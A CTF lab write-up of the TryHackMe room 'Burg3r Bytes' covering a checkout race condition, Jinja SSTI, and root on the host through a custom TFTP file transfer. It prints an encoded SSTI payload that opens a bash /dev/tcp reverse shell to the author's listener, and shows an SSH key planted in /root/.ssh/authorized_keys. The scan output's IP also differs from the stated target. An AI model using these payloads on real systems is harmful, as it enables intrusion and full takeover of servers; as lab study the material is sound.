## TryHack3M: Burg3r Bytes

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/TryHack3M%3A%20Burg3r%20Bytes/Images/burg3r.png)

Room Description: They say these burgers are worth every penny. Can you buy one?

> Scenario: 
> Burg3r Bytes is a global fast-food giant renowned for its burgers and pizzas. Recently, rumours have surfaced on underground forums about a glitch in Burg3r Byte's checkout system that allows users to manipulate orders. Your goal? Exploit this system to score the ultimate haul: 3 million burgers or pizzas.

> Challenge Background:
> Burg3r Bytes has recently upgraded its checkout system, implementing a modern digital ordering platform to help streamline operations. This new release offers a first sign-up £10 voucher to spend on any order. There is also a free order promotion for the 3 millionth customer; Burg3r Bytes will pay for all items! However, after rushing deployment, some system architecture flaws were left. Can you figure them out?

---

## Objectives

1. What is the web app flag?
2. What is the host flag?

---

## Summary
- **Target IP:** 10.130.128.174
- **OS:** Linux (Ubuntu)
- **Vulnerabilities:** Race Condition, SSTI, insecure direct object reference / arbitrary file write via the custom TFTP implementation


![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/TryHack3M%3A%20Burg3r%20Bytes/Images/Screenshot%20From%202026-08-01%2002-18-58.png)

---

## Adding the target to hosts

```shell
sudo echo -e '10.130.128.174 burger.thm' | sudo tee -a /etc/hosts
```

---

## Enumeration & Recon

> Rustscan results

```shell
rustscan -a burger.thm --ulimit 5000 -- -sCV -O
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned ports so fast, even my computer was surprised.

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.130.181.128:22
Open 10.130.181.128:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -O" on ip 10.130.181.128
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 f4:bc:07:80:75:e8:07:d1:43:e2:c3:fc:b1:7b:fb:c2 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCeG9my49UdM7lkjRSKkk1eSbIjK+NWS8lN+pjwJ4g/i/SBsWJ4wbf7TtKQxmKfxfWi4uQEwiu6BZCMwKhCapJcX2ZuVmomeLj6O8Tm7MeysCzhAaRhXmtPXbXlx00nTSX5AC7V3q2OFtOE9mco+m8E0X3/btckemJLydOnu9slB++eXHGjtBSnIPDTnQnVq5FaojNb3xkZlPIw/N82/iQ8fP0ya5lXSJwlngNG6sfFx/ujkkgGnDLHMnsIk6mYRUHsfHqMMrudXc0iJ7FmVnHAjU03lNsv0xnJgxVCnWgymx179npSelfrjP1/brAU0uAron3pRhLJDCJUaFU6HjJ6Yxi9x83tOkxXsfvVXYlN/0nhMJZSv7m+wZVVTpo5sUogBPeOABZGJ5d2INEX/2uonp+BuP7TFIUE8by8pjqPBzCRfLqgPFzVEb5jJsvWRLOz2eIh2VdCd3HlrGrHCm36KSm+VdsymsvYt5MWYk06HEpPNj/opWPuJATit6oLGg0=
|   256 7b:b4:bb:a5:30:0e:18:53:00:47:66:47:d1:dd:cc:2a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJqhiK+4PAT5dnBoPEHMkxk9/sq7WTcSOjWHLSfYWpCcem972E9BzFo5Kb9GEr2RT1UtCd+50SoR5kI5D8A+gCg=
|   256 cd:d6:4d:8d:00:cb:cd:53:d1:d5:52:10:06:f6:bf:07 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMz0K/Hym5YB5fca2jQcQGwMcwCkZOwf5I8n1o3e8QmE
80/tcp open  http    syn-ack ttl 61 Werkzeug httpd 3.0.2 (Python 3.8.10)
|_http-title: Burg3rByte
|_http-server-header: Werkzeug/3.0.2 Python/3.8.10
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
```

> Feroxbuster

```shell
feroxbuster -u http://burger.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
                                                                                                                                                                   
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://burger.thm/
 🚩  In-Scope Url          │ burger.thm
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        5l       22w      211c http://burger.thm/add-to-basket => http://burger.thm/?err=NXITEM
200      GET       93l      491w     6390c http://burger.thm/basket
200      GET      119l      236w     2109c http://burger.thm/static/css/stylesheet.css
200      GET        6l     2116w   161972c http://burger.thm/static/css/bootstrap.min.css
200      GET      101l      527w     7724c http://burger.thm/login
200      GET        6l     1015w    83205c http://burger.thm/static/js/bootstrap.min.js
200      GET        2l     1294w    89501c http://burger.thm/static/js/jquery.min.js
200      GET      101l      529w     7773c http://burger.thm/register
200      GET      538l     2936w   272828c http://burger.thm/static/img/pasta1.jpg
200      GET      516l     3125w   299870c http://burger.thm/static/img/burger1.jpg
200      GET      446l     2899w   298680c http://burger.thm/static/img/burger2.jpg
200      GET     1020l     5873w   470247c http://burger.thm/static/img/pizza1.jpg
200      GET     2096l    12099w  1067920c http://burger.thm/static/img/pie1.jpg
200      GET     3800l    21778w  1838240c http://burger.thm/static/img/burger3.png
200      GET      209l      901w    12758c http://burger.thm/
302      GET        5l       22w      201c http://burger.thm/remove-from-basket => http://burger.thm/basket
200      GET       81l      201w     3095c http://burger.thm/checkout
200      GET       45l      144w     1563c http://burger.thm/console
[####################] - 14m   220577/220577  0s      found:18      errors:1      
[####################] - 14m   220546/220546  260/s   http://burger.thm/
```

---

> The landing page

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/TryHack3M%3A%20Burg3r%20Bytes/Images/Screenshot%20From%202026-07-31%2021-38-16.png)

> When adding an item to the basket, it sends a request: `http://burger.thm/add-to-basket?itemid=TRYHACK3M`.

> /basket endpoint:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/TryHack3M%3A%20Burg3r%20Bytes/Images/Screenshot%20From%202026-07-31%2021-38-37.png)

> In the /checkout, it requires a username and an optional voucher code which applies discount. Obviously we do not have any money since the price is 3 million dollars. So a discount is the only way. After some time, I tried what seemed like an id for a product, was also actually the voucher code! However, we will need more than just 50% discount. I thought if I could use it more than once, because it was the only way, like race condition. 

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/TryHack3M%3A%20Burg3r%20Bytes/Images/Screenshot%20From%202026-07-31%2021-39-11.png)

> Instead of working on a script, I just spammed the checkout button before it applied the discount, and luckily, it worked! However, it only worked on chromium, and not firefox. I noticed that each time I clicked on the checkout button, the tab was reloading again and again, giving a more possible race condition, unlike on firefox, uninterrupting the first request, and still loading it. You can open two browsers and press it at the same time as alternative.

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/TryHack3M%3A%20Burg3r%20Bytes/Images/Screenshot%20From%202026-07-31%2021-44-21.png)

> Okay, we got that iridescent product, now what? I noticed that it displayed my username on the url. Maybe SSTI? I used `{{ 7*7 }}` for checking, and it worked pretty well! Instead of printing it as literal string, it evaluated the result and showed '49'!

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/TryHack3M%3A%20Burg3r%20Bytes/Images/Screenshot%20From%202026-07-31%2021-46-18.png)

> Looks like we are root, sweet!

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/TryHack3M%3A%20Burg3r%20Bytes/Images/Screenshot%20From%202026-07-31%2023-47-26.png)

> First flag:

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/TryHack3M%3A%20Burg3r%20Bytes/Images/Screenshot%20From%202026-07-31%2023-47-26.png)

---

## Reverse Shell via SSTI

> Let's try a reverse shell payload while listening on 4444 port.

> Payload:

```text
{{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27echo%20%22KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC4xNTIuMzUvNDQ0NCAwPiYxKSAm%22%20%20|%20base64%20-d%20|%20bash%27).read()}}
```

> Tab 2:

```bash
penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 172.17.0.1 • 192.168.152.35
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => 7b05c5df3d55 10.130.128.174 Linux-x86_64 👤 root(0) 😍️ Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /root/.penelope/sessions/7b05c5df3d55~10.130.128.174-Linux-x86_64/2026_07_31-16_06_50-986-root(0).log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@7b05c5df3d55:/app# id
uid=0(root) gid=0(root) groups=0(root)
root@7b05c5df3d55:/app# 
```

> Looks like we are inside a docker container

```bash
root@7b05c5df3d55:~# cat /proc/1/cgroup
13:freezer:/docker/7b05c5df3d5573d166d48a49141ea6099f4a43ef0088a8edd9964226c52facc8
12:cpuset:/docker/7b05c5df3d5573d166d48a49141ea6099f4a43ef0088a8edd9964226c52facc8
11:misc:/docker/7b05c5df3d5573d166d48a49141ea6099f4a43ef0088a8edd9964226c52facc8
10:net_cls,net_prio:/docker/7b05c5df3d5573d166d48a49141ea6099f4a43ef0088a8edd9964226c52facc8
9:memory:/docker/7b05c5df3d5573d166d48a49141ea6099f4a43ef0088a8edd9964226c52facc8
8:hugetlb:/docker/7b05c5df3d5573d166d48a49141ea6099f4a43ef0088a8edd9964226c52facc8
7:devices:/docker/7b05c5df3d5573d166d48a49141ea6099f4a43ef0088a8edd9964226c52facc8
6:rdma:/docker/7b05c5df3d5573d166d48a49141ea6099f4a43ef0088a8edd9964226c52facc8
5:pids:/docker/7b05c5df3d5573d166d48a49141ea6099f4a43ef0088a8edd9964226c52facc8
4:cpu,cpuacct:/docker/7b05c5df3d5573d166d48a49141ea6099f4a43ef0088a8edd9964226c52facc8
3:blkio:/docker/7b05c5df3d5573d166d48a49141ea6099f4a43ef0088a8edd9964226c52facc8
2:perf_event:/docker/7b05c5df3d5573d166d48a49141ea6099f4a43ef0088a8edd9964226c52facc8
1:name=systemd:/docker/7b05c5df3d5573d166d48a49141ea6099f4a43ef0088a8edd9964226c52facc8
0::/docker/7b05c5df3d5573d166d48a49141ea6099f4a43ef0088a8edd9964226c52facc8
```

---

## Privilege Escalation: TFTP file transportation leads to Host Pwnage

> I could not find any way of escaping the container, so I wanted to download or transfer linpeas, but there was no nc, curl, ss, could not even download anything from internet. So I base64 encoded the contents, and used it like that. It was tightly secured. But there was a cronjob which used signing keys to transfer file from another machine over tftp (port 69). 


```shell
root@7b05c5df3d55:/app/cron# python3 client_py.py 172.17.0.1 69
file received!
root@7b05c5df3d55:/app/cron# ls
client.crt  client.key  client_py.py  crontab  encoded.txt  exploit.py  linpeas.sh  site.db
root@7b05c5df3d55:/app/cron# 
root@7b05c5df3d55:/app/cron# cat site.db
���B[tablevouchervoucherCREATE TABLE voucher (
        id INTEGER NOT NULL, 
        code VARCHAR(100) NOT NULL, 
        discount FLOAT NOT NULL, 
        expiration_date DATETIME, 
        PRIMARY KEY (id), 
        UNIQUE (code)
��TRYHACK3M2e_autoindex_voucher_1voucher
��
        TRYHACK3Mroot@7b05c5df3d55:/app/cron#
```

> Unfortunately, I was not able to guess the file name inside /root, so I received server.crt to be able to RSA encrypt the files I need to send.

```shell
root@7b05c5df3d55:/app/cron# python3 client_py.py 172.17.0.1 69 server.crt
file received and saved as server.crt!
```

> With the modified script that supports both download and upload, I was able to perform both functionalities. Find the script [here](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/TryHack3M%3A%20Burg3r%20Bytes/client_py.py)

> Python script usage (upload/download): python3 client_py.py -ip- -port- -mode- <DIRECTORY/FILE>

> Attacker Kali machine:

```
1. ssh-keygen -t rsa

2. chmod +600 /root/.ssh/id_rsa
```

> Victim machine

```shell
# IP ADDRESS
root@7b05c5df3d55:/app/cron# cat hostname
ip-10-130-128-174
#Save /root/.ssh/id_rsa.pub as authorized_keys and send it to host machine
echo "...qqylmxz/qWAaEmk= root@kali" > authorized_keys
root@7b05c5df3d55:/app/cron# python3 client_py.py 172.17.0.1 69 upload authorized_keysFile sent successfully to remote path: /root/.ssh/authorized_keys
```

## Reverse Shell to Host

```shell
ssh -i /root/.ssh/id_rsa root@10.130.128.174
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1056-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Fri Jul 31 21:50:33 UTC 2026

  System load:  0.05               Processes:                287
  Usage of /:   25.7% of 29.01GB   Users logged in:          0
  Memory usage: 31%                IPv4 address for docker0: 172.17.0.1
  Swap usage:   0%                 IPv4 address for ens5:    10.130.128.174

  => There are 154 zombie processes.

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

Expanded Security Maintenance for Infrastructure is not enabled.

173 updates can be applied immediately.
125 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

130 additional security updates can be applied with ESM Infra.
Learn more about enabling ESM Infra service for Ubuntu 20.04 at
https://ubuntu.com/20-04


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ip-10-130-128-174:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ip-10-130-128-174:~# cat <redacted>.txt 
THM{<redacted>}
root@ip-10-130-128-174:~# 
```

![image](https://github.com/Velatryx/CTF-Writeups/blob/main/AcademyLabs/TryHackMe/Hard/TryHack3M%3A%20Burg3r%20Bytes/Images/Screenshot%20From%202026-08-01%2002-11-22.png)

---

> PWNED!

